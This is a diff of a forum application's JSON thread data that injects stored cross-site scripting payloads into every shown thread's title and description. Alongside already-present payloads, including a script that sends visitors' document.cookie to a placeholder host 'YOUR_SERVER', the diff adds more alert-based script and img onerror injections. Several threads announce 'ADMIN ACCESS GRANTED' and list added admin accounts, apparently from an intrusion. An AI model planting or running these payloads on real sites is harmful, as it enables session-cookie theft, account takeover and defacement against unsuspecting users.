@@ -2,7 +2,7 @@
   "threads": [
     {
       "id": 1784378663054,
-      "title": "<img src=x onerror=\"alert('XSS')\">",
+      "title": "<img src=x onerror=\"alert('XSS')\"> <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "hacker",
       "authorId": "999999999999999997",
       "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
@@ -10,7 +10,7 @@
       "tag": "Crack",
       "tagClass": "tag-red",
       "link": null,
-      "description": "<script>fetch(\"https://YOUR_SERVER/log?cookie=\"+document.cookie)</script>",
+      "description": "<script>fetch(\"https://YOUR_SERVER/log?cookie=\"+document.cookie)</script><script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [],
       "category": "news",
       "pinned": false,
@@ -18,7 +18,7 @@
     },
     {
       "id": 1784379385702,
-      "title": "ADMIN ACCESS GRANTED",
+      "title": "ADMIN ACCESS GRANTED <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "ez sk33t",
       "authorId": "123456789012345678",
       "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
@@ -26,7 +26,7 @@
       "tag": "Admin",
       "tagClass": "tag-purple",
       "link": null,
-      "description": "Admin users added:\n- ez sk33t\n- k1llsync456",
+      "description": "Admin users added:\n- ez sk33t\n- k1llsync456<script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [],
       "category": "news",
       "pinned": true,
@@ -34,7 +34,7 @@
     },
     {
       "id": 1784379561725,
-      "title": "ADMIN ACCESS GRANTED - Welcome!",
+      "title": "ADMIN ACCESS GRANTED - Welcome! <img src=x onerror=\"alert('XSS INJECTED')\">",
       "author": "ez sk33t",
       "authorId": "123456789012345678",
       "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
@@ -42,7 +42,7 @@
       "tag": "Admin",
       "tagClass": "tag-purple",
       "link": null,
-      "description": "Admin users added:\n- ez sk33t\n- k1llsync456\n\nYou can now use the admin panel.",
+      "description": "Admin users added:\n- ez sk33t\n- k1llsync456\n\nYou can now use the admin panel.<script>alert(\"XSS injected into all threads!\")</script>",
       "comments": [],
       "category": "news",
       "pinned": true,
